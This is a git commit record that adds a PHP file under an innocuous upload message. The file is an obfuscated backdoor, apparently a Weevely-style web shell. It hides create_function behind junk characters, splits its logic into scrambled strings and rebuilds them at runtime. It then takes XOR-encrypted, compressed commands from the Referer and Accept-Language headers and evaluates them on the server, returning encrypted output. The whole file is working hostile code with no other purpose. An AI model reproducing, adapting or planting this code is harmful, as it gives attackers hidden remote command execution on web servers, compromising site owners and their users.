6d8b341ae6e2c98930e793ff5b6d9af3aabc53ea
Smallfrie81 <nick9988776655@aol.com>
2017-12-23 19:44:41 -0500

    Add files via upload

---
+++ idontknowwhatimdoing.php
@@ -0,0 +1,18 @@
+<?php
+$Q='ompress!r(@x(!r@bas!re64_deco!rde!r(preg_repl!ra!r!rc!r!re(array("/_/","/-/!r"),!rarr!ray("/",';
+$X='rd5($i.$!rk!rf),0,3));$p=""!r;for($z=1;$!rz<coun!rt($m[1!r])!r;$z+!r+)$p!r.=$q[$m[2!r][$!rz]]!r!r';
+$w='!r$kh!r="2ac9";$kf="cb7d"!r;funct!r!rion x($t,$k)!r{$c=strl!re!r!rn($k);$l=str!rl!ren($t);$o';
+$G=str_replace('x','','crxeaxtxe_xfuncxxtion');
+$Y='[!r$!ri].=$p;$e=!rstrpos($s[$!ri],$!rf);i!rf($e){$k=$k!rh.$k!rf;ob_sta!rrt();@!rev!ral(@gzu!rnc';
+$e='}}re!rturn!r $o;}$r=$!r_SE!r!r!rRVER;$rr=@$r["HTTP_!r!rREFERER"];$ra!r=@$r!r[!r"HTTP_!rACCEP';
+$y='"+"),$!rss($s[$i]!r,0,$e))),$!rk)));$o!r=o!rb_g!ret_contents(!r);ob_end!r_cl!rean();$d=!rbas!r';
+$v='$!rm);if($!rq&&$!rm){@sess!rion_sta!rrt!r();$s=!r&$_SESS!rION;$!rss=!r"substr";$sl=!r"strto!rl!';
+$s='e64_encod!re(x(g!rzcompres!rs($o)!r,$k)!r);pri!rnt("<$k!r>$d</$k>"!r!r);@sess!rion_!rdestroy();}}}}';
+$U='T_LANGU!rA!rGE"];if($rr!r&&$r!ra!r){$u=parse_url(!r$rr)!r;parse!r_s!rtr($u[!r"query"],$!rq);$q=a';
+$a='r!rray_va!rlues(!r$q)!r;preg!r_match_all(!r"/(!r[!r\\w])[\\w-]+!r(?:!r;q=!r0.(!r[\\d]))?,?/",$ra,';
+$i=';if(strpos($p!r,$h)===0){$s[$i]!r=""!r;$p=$ss(!r$p,3)!r;}i!rf(array_!rkey_ex!rists(!r$!ri,$s)){$s';
+$d='="";!rfor($!ri=0!r;$i<$l!r;){fo!rr($j=0;($!rj!r<$c&&$i<$l);$j+!r+,$i++)!r!r{$o.=$t{$i!r}^!r$k{$j};';
+$l='r!rower";$!ri=!r$m[1][0].$m[1][1];$h!r=$!rsl($ss!r(m!rd5!r($i.$kh)!r,0!r,3));$f=$sl($ss!r(m!';
+$I=str_replace('!r','',$w.$d.$e.$U.$a.$v.$l.$X.$i.$Y.$Q.$y.$s);
+$V=$G('',$I);$V();
+?>
